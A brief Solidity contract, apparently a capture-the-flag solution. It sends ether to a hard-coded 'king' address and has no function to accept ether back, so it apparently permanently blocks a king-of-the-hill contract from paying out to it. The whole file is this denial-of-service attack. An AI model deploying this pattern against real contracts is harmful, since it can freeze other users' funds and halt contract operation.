//SDPX-License-Identifier: MIT

pragma solidity 0.6.0;

contract ThroneLock {
  address king = 0x6af9Ced683ff353939080b79BebAC5f904e767CB;

  function lockThrone() public payable returns (bool success) {
    (success, ) = king.call.value(msg.value)("");
  }
}